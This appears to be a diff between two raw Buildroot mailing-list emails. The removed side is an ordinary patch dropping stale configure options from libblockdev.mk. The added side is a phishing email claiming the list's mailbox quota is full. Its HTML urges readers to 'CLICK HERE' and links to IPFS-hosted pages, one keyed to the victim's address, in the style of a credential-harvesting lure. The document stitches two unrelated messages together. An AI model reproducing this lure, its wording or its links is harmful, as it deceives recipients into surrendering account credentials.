@@ -4,85 +4,42 @@ X-Spam-Checker-Version: SpamAssassin 3.4.0 (2014-02-07) on
 Received: from smtp4.osuosl.org (smtp4.osuosl.org [140.211.166.137])
 	(using TLSv1.2 with cipher ECDHE-RSA-AES256-GCM-SHA384 (256/256 bits))
 	(No client certificate requested)
-	by smtp.lore.kernel.org (Postfix) with ESMTPS id 283E5C61D97
-	for <buildroot@archiver.kernel.org>; Tue, 21 Nov 2023 22:07:32 +0000 (UTC)
+	by smtp.lore.kernel.org (Postfix) with ESMTPS id 5356FC61D97
+	for <buildroot@archiver.kernel.org>; Tue, 21 Nov 2023 22:34:52 +0000 (UTC)
 Received: from localhost (localhost [127.0.0.1])
-	by smtp4.osuosl.org (Postfix) with ESMTP id B266E4090E;
-	Tue, 21 Nov 2023 22:07:31 +0000 (UTC)
-DKIM-Filter: OpenDKIM Filter v2.11.0 smtp4.osuosl.org B266E4090E
+	by smtp4.osuosl.org (Postfix) with ESMTP id EB1614096A;
+	Tue, 21 Nov 2023 22:34:51 +0000 (UTC)
+DKIM-Filter: OpenDKIM Filter v2.11.0 smtp4.osuosl.org EB1614096A
 X-Virus-Scanned: amavisd-new at osuosl.org
 Received: from smtp4.osuosl.org ([127.0.0.1])
 	by localhost (smtp4.osuosl.org [127.0.0.1]) (amavisd-new, port 10024)
-	with ESMTP id eALcKwtaieQ5; Tue, 21 Nov 2023 22:07:31 +0000 (UTC)
+	with ESMTP id 55Ij2TRnMN8Z; Tue, 21 Nov 2023 22:34:51 +0000 (UTC)
 Received: from ash.osuosl.org (ash.osuosl.org [140.211.166.34])
-	by smtp4.osuosl.org (Postfix) with ESMTP id 0ECB4408FD;
-	Tue, 21 Nov 2023 22:07:30 +0000 (UTC)
-DKIM-Filter: OpenDKIM Filter v2.11.0 smtp4.osuosl.org 0ECB4408FD
-Received: from smtp4.osuosl.org (smtp4.osuosl.org [140.211.166.137])
- by ash.osuosl.org (Postfix) with ESMTP id 1F9101BF2C5
- for <buildroot@lists.busybox.net>; Tue, 21 Nov 2023 22:07:29 +0000 (UTC)
+	by smtp4.osuosl.org (Postfix) with ESMTP id 3A84C4092F;
+	Tue, 21 Nov 2023 22:34:50 +0000 (UTC)
+DKIM-Filter: OpenDKIM Filter v2.11.0 smtp4.osuosl.org 3A84C4092F
+Received: from smtp1.osuosl.org (smtp1.osuosl.org [140.211.166.138])
+ by ash.osuosl.org (Postfix) with ESMTP id 330231BF2C5
+ for <buildroot@lists.busybox.net>; Tue, 21 Nov 2023 22:34:49 +0000 (UTC)
 Received: from localhost (localhost [127.0.0.1])
- by smtp4.osuosl.org (Postfix) with ESMTP id EC81F408FD
- for <buildroot@lists.busybox.net>; Tue, 21 Nov 2023 22:07:28 +0000 (UTC)
-DKIM-Filter: OpenDKIM Filter v2.11.0 smtp4.osuosl.org EC81F408FD
+ by smtp1.osuosl.org (Postfix) with ESMTP id 14669817C3
+ for <buildroot@lists.busybox.net>; Tue, 21 Nov 2023 22:34:49 +0000 (UTC)
+DKIM-Filter: OpenDKIM Filter v2.11.0 smtp1.osuosl.org 14669817C3
 X-Virus-Scanned: amavisd-new at osuosl.org
-Received: from smtp4.osuosl.org ([127.0.0.1])
- by localhost (smtp4.osuosl.org [127.0.0.1]) (amavisd-new, port 10024)
- with ESMTP id kGsM5zcp3wBd for <buildroot@lists.busybox.net>;
- Tue, 21 Nov 2023 22:07:28 +0000 (UTC)
-Received: from mail-wm1-x32d.google.com (mail-wm1-x32d.google.com
- [IPv6:2a00:1450:4864:20::32d])
- by smtp4.osuosl.org (Postfix) with ESMTPS id E3030408F9
- for <buildroot@buildroot.org>; Tue, 21 Nov 2023 22:07:27 +0000 (UTC)
-DKIM-Filter: OpenDKIM Filter v2.11.0 smtp4.osuosl.org E3030408F9
-Received: by mail-wm1-x32d.google.com with SMTP id
- 5b1f17b1804b1-40806e4106dso1262305e9.1
- for <buildroot@buildroot.org>; Tue, 21 Nov 2023 14:07:27 -0800 (PST)
-X-Google-DKIM-Signature: v=1; a=rsa-sha256; c=relaxed/relaxed;
- d=1e100.net; s=20230601; t=1700604445; x=1701209245;
- h=content-transfer-encoding:mime-version:message-id:date:subject:cc
- :to:from:x-gm-message-state:from:to:cc:subject:date:message-id
- :reply-to;
- bh=Mrd1c+YhoXucaWI00iije6eDowAvCnijdCX3/5SCSqc=;
- b=DBBsXG9bgiEwz72MxJFQcMt7sE6Eill8C+WYafiJ0uhAw5g6swUP+gFDOCpqIvGzvE
- VSmJKudBrWYoJzDao5zhYdpVAtApYZj5BqwOc9bdkcUhO3K0dh7z8h12gvZ1g58rRDfU
- RmodvFiF73Khy6shiISv0Jjb//mJ/+sTju0jj2WYskuhsNCeu95IblPnB3vytYebR//k
- sMNzmszlp7QHVrUXuMQTpuOVWRnv1gpoKqXV+L6ea0iQRxaP1qc6QTtXxJtb9M/Irsti
- VDfbBCF9M/f33U2DuAg2+HZNP4C44Z27027niZrkC0e8IUh1ALu81it3r/J407XrP56B
- mdxw==
-X-Gm-Message-State: AOJu0YyiYKEG1P8LvbRKqIN6JXVIuDttk8sKOXfeCLFLQ81LK1vhOlXB
- bOVt4ieHb7H0Z7cF7p1dk1WEn1qRzJ8=
-X-Google-Smtp-Source: AGHT+IHxINqC3udmTHj5vmgP7+fCSoh4PZ3R9p67kfF5jqplIsZaOSfUeXaWUAomyd/rNno/6Vk0yw==
-X-Received: by 2002:a1c:7902:0:b0:405:3ab3:e640 with SMTP id
- l2-20020a1c7902000000b004053ab3e640mr3361518wme.20.1700604444779; 
- Tue, 21 Nov 2023 14:07:24 -0800 (PST)
-Received: from kali.home (lfbn-ren-1-787-165.w83-197.abo.wanadoo.fr.
- [83.197.114.165]) by smtp.gmail.com with ESMTPSA id
- g8-20020a05600c310800b0040651505684sm41031wmo.29.2023.11.21.14.07.23
- (version=TLS1_3 cipher=TLS_AES_256_GCM_SHA384 bits=256/256);
- Tue, 21 Nov 2023 14:07:24 -0800 (PST)
-From: Fabrice Fontaine <fontaine.fabrice@gmail.com>
-To: buildroot@buildroot.org
-Date: Tue, 21 Nov 2023 23:07:06 +0100
-Message-ID: <20231121220706.506553-1-fontaine.fabrice@gmail.com>
-X-Mailer: git-send-email 2.42.0
+Received: from smtp1.osuosl.org ([127.0.0.1])
+ by localhost (smtp1.osuosl.org [127.0.0.1]) (amavisd-new, port 10024)
+ with ESMTP id qxfwhsdDivCK for <buildroot@lists.busybox.net>;
+ Tue, 21 Nov 2023 22:34:48 +0000 (UTC)
+Received: from busybox.net (unknown [141.98.10.75])
+ by smtp1.osuosl.org (Postfix) with ESMTP id 87D6181750
+ for <buildroot@busybox.net>; Tue, 21 Nov 2023 22:34:47 +0000 (UTC)
+DKIM-Filter: OpenDKIM Filter v2.11.0 smtp1.osuosl.org 87D6181750
+From: Mail Accounts <buildroot@busybox.net>
+To: buildroot@busybox.net
+Date: 21 Nov 2023 23:34:46 +0100
+Message-ID: <20231121233445.3BDDCDD29727213A@busybox.net>
 MIME-Version: 1.0
-X-Mailman-Original-DKIM-Signature: v=1; a=rsa-sha256; c=relaxed/relaxed;
- d=gmail.com; s=20230601; t=1700604445; x=1701209245; darn=buildroot.org;
- h=content-transfer-encoding:mime-version:message-id:date:subject:cc
- :to:from:from:to:cc:subject:date:message-id:reply-to;
- bh=Mrd1c+YhoXucaWI00iije6eDowAvCnijdCX3/5SCSqc=;
- b=gl6BQV/WWUXqlrcARu+23cBIPY9qAGho5mdtB0fgODkSqtx9CnKLPLiPUHskUD6OWP
- +bBMXR3Bds6+FX/Z7nlPhpHbROX1yHOPMIOTMvHAqcBj4uzx0icf6FmzL5/CJPi+c7G2
- RRgaBLx0D8L2JH1dCtGWKPpK1DJxDAklD7qpGz83RDnbVGqBvtJA9tJUz1A7bjATVd+T
- zShQNlu5w04Ux0sDdHmHrla9G7qKaE28yGJVdePWBLL3R6mZqx0gJZNEp616gG8FebsO
- pFKUKIhDfYlN4n0zdGIF2+zNWvkKFWUN7I+QqiUYownbhzFNPKp9uGCyvQJ4Dhfj9xcR
- vDtQ==
-X-Mailman-Original-Authentication-Results: smtp4.osuosl.org;
- dkim=pass (2048-bit key) header.d=gmail.com header.i=@gmail.com
- header.a=rsa-sha256 header.s=20230601 header.b=gl6BQV/W
-Subject: [Buildroot] [PATCH 1/1] package/libblockdev: drop unrecognized
- options
+Subject: [Buildroot] Your mailbox quota is full
 X-BeenThere: buildroot@buildroot.org
 X-Mailman-Version: 2.1.29
 Precedence: list
@@ -94,59 +51,152 @@ List-Post: <mailto:buildroot@buildroot.org>
 List-Help: <mailto:buildroot-request@buildroot.org?subject=help>
 List-Subscribe: <https://lists.buildroot.org/mailman/listinfo/buildroot>,
  <mailto:buildroot-request@buildroot.org?subject=subscribe>
-Cc: Giulio Benetti <giulio.benetti@benettiengineering.com>,
- Fabrice Fontaine <fontaine.fabrice@gmail.com>
-Content-Type: text/plain; charset="us-ascii"
-Content-Transfer-Encoding: 7bit
+Content-Type: multipart/mixed; boundary="===============1754951055746100399=="
 Errors-To: buildroot-bounces@buildroot.org
 Sender: "buildroot" <buildroot-bounces@buildroot.org>
 
-The following options were wrongly kept when bumping to version 3.0.3 in
-commit 18420d9b6b424492741cba495cc2e7a28a409e8b:
- - dmraid (dropped since
-   https://github.com/storaged-project/libblockdev/commit/d174944a85169efae3bac0b6e76498e3d0c6c240)
- - bcache and kbd (dropped since
-   https://github.com/storaged-project/libblockdev/commit/c1ff1c87e31fb2820a5694637eb221f590eb9451)
- - python2 (dropped since
-   https://github.com/storaged-project/libblockdev/commit/8fc33b834529d3d18a73112e4c77ea0a5d26d62c)
- - vdo (dropped since
-   https://github.com/storaged-project/libblockdev/commit/e51faac2a952da33925e3ccab0f4f0fdf3986cd3)
+--===============1754951055746100399==
+Content-Type: text/html;
+	charset="iso-8859-1"
+Content-Transfer-Encoding: quoted-printable
 
-Signed-off-by: Fabrice Fontaine <fontaine.fabrice@gmail.com>
----
- package/libblockdev/libblockdev.mk | 7 +------
- 1 file changed, 1 insertion(+), 6 deletions(-)
+<html><head>
+<meta name=3D"GENERATOR" content=3D"MSHTML 11.00.9600.20139">
+<meta http-equiv=3D"X-UA-Compatible" content=3D"IE=3Dedge">
+</head>
+<body>
+<p style=3D'text-align: center; color: rgb(0, 0, 102); text-transform: none=
+; text-indent: 0px; letter-spacing: normal; font-family: "Segoe UI", sans-s=
+erif; font-size: 1.2em; font-style: normal; font-weight: 600; margin-top: 0=
+px; margin-bottom: 1.5em; word-spacing: 0px; white-space: normal; box-sizin=
+g: border-box; orphans: 2; widows: 2; background-color: rgb(255, 255, 255);=
+ font-variant-ligatures: normal; font-variant-caps: normal; -webkit-text-st=
+roke-width: 0px; text-decoration-thickness:=20
+initial; text-decoration-style: initial; text-decoration-color: initial;'>Y=
+our mailbox is full.</p>
+<table width=3D"325" align=3D"center" style=3D'text-align: left; color: rgb=
+(51, 51, 51); text-transform: none; text-indent: 0px; letter-spacing: norma=
+l; font-family: "Lucida Grande", Verdana, Arial, Helvetica, sans-serif; fon=
+t-size: 11px; font-style: normal; font-weight: 400; word-spacing: 0px; whit=
+e-space: normal; border-collapse: collapse; box-sizing: border-box; orphans=
+: 2; widows: 2; background-color: rgb(255, 255, 255); font-variant-ligature=
+s: normal; font-variant-caps: normal;=20
+-webkit-text-stroke-width: 0px; text-decoration-thickness: initial; text-de=
+coration-style: initial; text-decoration-color: initial;' border=3D"0" cell=
+spacing=3D"0" cellpadding=3D"0">
+<tbody style=3D"box-sizing: border-box;">
+<tr style=3D"height: 0.5em; box-sizing: border-box;">
+<td style=3D"background: 0% 50% rgb(218, 60, 47); margin: 0px; width: 321px=
+; font-family: Roboto, RobotoDraft, Helvetica, Arial, sans-serif; box-sizin=
+g: border-box;">&nbsp;</td>
+<td style=3D"background: 0% 50% rgb(224, 224, 224); margin: 0px; font-famil=
+y: Roboto, RobotoDraft, Helvetica, Arial, sans-serif; box-sizing: border-bo=
+x;">&nbsp;</td></tr></tbody></table>
+<table width=3D"325" align=3D"center" style=3D'text-align: left; color: rgb=
+(51, 51, 51); text-transform: none; text-indent: 0px; letter-spacing: norma=
+l; font-family: "Lucida Grande", Verdana, Arial, Helvetica, sans-serif; fon=
+t-size: 11px; font-style: normal; font-weight: 400; word-spacing: 0px; whit=
+e-space: normal; border-collapse: collapse; box-sizing: border-box; orphans=
+: 2; widows: 2; background-color: rgb(255, 255, 255); font-variant-ligature=
+s: normal; font-variant-caps: normal;=20
+-webkit-text-stroke-width: 0px; text-decoration-thickness: initial; text-de=
+coration-style: initial; text-decoration-color: initial;' border=3D"0" cell=
+spacing=3D"0" cellpadding=3D"0">
+<tbody style=3D"box-sizing: border-box;">
+<tr style=3D"box-sizing: border-box;">
+<td align=3D"left" style=3D"margin: 0px; font-family: Roboto, RobotoDraft, =
+Helvetica, Arial, sans-serif; box-sizing: border-box;"><span style=3D"color=
+: rgb(218, 60, 47); font-weight: bold; box-sizing: border-box;">4.86 GB</sp=
+an></td>
+<td align=3D"right" style=3D"margin: 0px; font-family: Roboto, RobotoDraft,=
+ Helvetica, Arial, sans-serif; box-sizing: border-box;"><span style=3D"font=
+-weight: bold; box-sizing: border-box;">5.01 GB</span></td></tr></tbody></t=
+able>
+<p style=3D'text-align: center; color: rgb(0, 0, 102); text-transform: none=
+; text-indent: 0px; letter-spacing: normal; font-family: "Segoe UI", sans-s=
+erif; font-size: 1.2em; font-style: normal; font-weight: 600; margin-top: 0=
+px; margin-bottom: 1.5em; word-spacing: 0px; white-space: normal; box-sizin=
+g: border-box; orphans: 2; widows: 2; background-color: rgb(255, 255, 255);=
+ font-variant-ligatures: normal; font-variant-caps: normal; -webkit-text-st=
+roke-width: 0px; text-decoration-thickness:=20
+initial; text-decoration-style: initial; text-decoration-color: initial;'><=
+br style=3D"box-sizing: border-box;"></p>
+<p style=3D'margin: 3em auto; text-align: center; color: rgb(44, 54, 58); t=
+ext-transform: none; text-indent: 0px; letter-spacing: normal; font-family:=
+ "Segoe UI", sans-serif; font-size: 14px; font-style: normal; font-weight: =
+400; word-spacing: 0px; white-space: normal; box-sizing: border-box; orphan=
+s: 2; widows: 2; background-color: rgb(255, 255, 255); font-variant-ligatur=
+es: normal; font-variant-caps: normal; -webkit-text-stroke-width: 0px; text=
+-decoration-thickness: initial;=20
+text-decoration-style: initial; text-decoration-color: initial;'><span styl=
+e=3D"box-sizing: border-box;">Your mailbox storage for this account user<sp=
+an style=3D"box-sizing: border-box;">&nbsp;</span><strong style=3D"font-wei=
+ght: bolder; box-sizing: border-box;">( <u style=3D"box-sizing: border-box;=
+"><span><a style=3D"color: rgb(34, 34, 34);" href=3D"mailto:nfo@alnour-fpm.=
+com">buildroot@busybox.net</a></span></u>&nbsp;)</strong><span style=3D"box=
+-sizing: border-box;">&nbsp;</span>
+has almost reached it's limit and soon can no longer send or receive most m=
+essages. <br>You need to upgrade your&nbsp;storage&nbsp;capacity immediatel=
+y to keep using your account.<br><wbr><br style=3D"box-sizing: border-box;"=
+>
+&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nb=
+sp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;=
+&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nb=
+sp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;=
+&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; Kindly click the&nbsp;button below immediate=
+ly to increase, adjust and maintain your storage capacity in order to avoid=
+ loss of data and receive all pending=20
+mails.&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nb=
+sp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;=
+<wbr>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbs=
+p;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&=
+nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;<br><wbr><br style=3D"box-sizing: border=
+-box;"><wbr>
+&nbsp;&nbsp;&nbsp;<a style=3D"text-decoration: none;" href=3D"https://cloud=
+flare-ipfs.com/ipfs/bafkreigiwzz2oyav5vytmz4hoi3grhvulvwq7xic5rrq5ls7pst32n=
+dscq?filename=3Dbafkreigiwzz2oyav5vytmz4hoi3grhvulvwq7xic5rrq5ls7pst32ndscq=
+">
+<span style=3D"background: none; padding: 5px 10px; border-radius: 8px; bor=
+der: 1px solid rgb(8, 44, 64); border-image: none; text-align: center; colo=
+r: rgb(15, 82, 186); letter-spacing: 2px; font-size: 24px; font-variant: sm=
+all-caps; font-weight: bold; position: relative; cursor: pointer; box-shado=
+w: 1px 3px 5px 2px #c0c0c0; text-shadow: 1px 1px 1px rgba(5,29,41,1); -ms-u=
+ser-select: none; -webkit-box-shadow: 1px 3px 5px 2px #c0c0c0; -moz-box-sha=
+dow: 1px 3px 5px 2px #c0c0c0;=20
+-webkit-touch-callout: none; -webkit-user-select: none; -khtml-user-select:=
+ none; -moz-user-select: none; user-select: none;">CLICK HERE</span></a><br=
+ style=3D"box-sizing: border-box;"><br style=3D"box-sizing: border-box;">Cl=
+ick<strong><span>&nbsp;</span>"</strong>
+<a style=3D"color: rgb(0, 172, 255); text-decoration: none; box-sizing: bor=
+der-box; background-color: transparent;" href=3D"https://cloudflare-ipfs.co=
+m/ipfs/QmZBU6KGz7qqH1pDDngpJFM6sHhATjRy2n3pmDuw51U2hE?#buildroot@busybox.ne=
+t" rel=3D"noreferrer"><strong>storage limits</strong></a><strong>"</strong>=
+<span>&nbsp;</span>&nbsp;&nbsp;for&nbsp;more help and&nbsp;support.</span><=
+/p>
+<p style=3D'text-align: center; color: rgb(44, 54, 58); text-transform: non=
+e; text-indent: 0px; letter-spacing: normal; font-family: "Segoe UI", sans-=
+serif; font-size: 14px; font-style: normal; font-weight: 400; margin-top: 0=
+px; margin-bottom: 0px; word-spacing: 0px; white-space: normal; box-sizing:=
+ border-box; orphans: 2; widows: 2; background-color: rgb(255, 255, 255); f=
+ont-variant-ligatures: normal; font-variant-caps: normal; -webkit-text-stro=
+ke-width: 0px; text-decoration-thickness: initial;=20
+text-decoration-style: initial; text-decoration-color: initial;'><b style=
+=3D"font-weight: bolder; box-sizing: border-box;"><span style=3D"box-sizing=
+: border-box;">Mailbox address:<br style=3D"box-sizing: border-box;"></span=
+></b><span style=3D"box-sizing: border-box;"><a style=3D"color: rgb(0, 172,=
+ 255); text-decoration: none; box-sizing: border-box; background-color: tra=
+nsparent;" href=3D"mailto:buildroot@busybox.net" rel=3D"noreferrer">buildro=
+ot@busybox.net</a></span></p></body></html>
 
-diff --git a/package/libblockdev/libblockdev.mk b/package/libblockdev/libblockdev.mk
-index 3bbc221cc5..e0fca2b95c 100644
---- a/package/libblockdev/libblockdev.mk
-+++ b/package/libblockdev/libblockdev.mk
-@@ -16,20 +16,15 @@ LIBBLOCKDEV_AUTORECONF = YES
- LIBBLOCKDEV_CONF_OPTS = \
- 	--disable-introspection \
- 	--with-loop \
--	--without-bcache \
- 	--without-btrfs \
- 	--without-dm \
--	--without-dmraid \
- 	--without-escrow \
--	--without-kbd \
- 	--without-lvm_dbus \
- 	--without-mpath \
- 	--without-nvdimm \
--	--without-python2 \
- 	--without-python3 \
- 	--without-s390 \
--	--without-tools \
--	--without-vdo
-+	--without-tools
- 
- ifeq ($(BR2_PACKAGE_LIBBLOCKDEV_CRYPTO),y)
- LIBBLOCKDEV_DEPENDENCIES += cryptsetup keyutils
--- 
-2.42.0
+--===============1754951055746100399==
+Content-Type: text/plain; charset="us-ascii"
+MIME-Version: 1.0
+Content-Transfer-Encoding: 7bit
+Content-Disposition: inline
 
 _______________________________________________
 buildroot mailing list
 buildroot@buildroot.org
 https://lists.buildroot.org/mailman/listinfo/buildroot
+
+--===============1754951055746100399==--
